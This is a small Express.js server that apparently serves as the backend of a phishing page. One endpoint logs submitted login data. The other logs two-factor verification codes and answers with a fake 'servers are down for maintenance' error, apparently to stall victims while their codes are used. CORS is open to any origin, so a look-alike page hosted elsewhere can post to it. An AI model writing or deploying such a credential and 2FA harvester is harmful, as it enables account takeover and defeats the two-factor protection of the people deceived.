const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 3002;

app.use(bodyParser.json());
app.use(cors()); // Enable CORS for all routes

app.post('/login', (req, res) => {
    console.log('Login request received:', req.body);
    res.status(200).send('Login data received');
});

// Endpoint to handle 2FA verification
app.post('/verify2FA', (req, res) => {
    // Log the received 2FA code
    console.log('2FA verification code received:', req.body.verificationCode);

    // Simulate a server error response
    res.status(503).send('Servers are down for maintenance, please try again in a few hours');
});

app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});
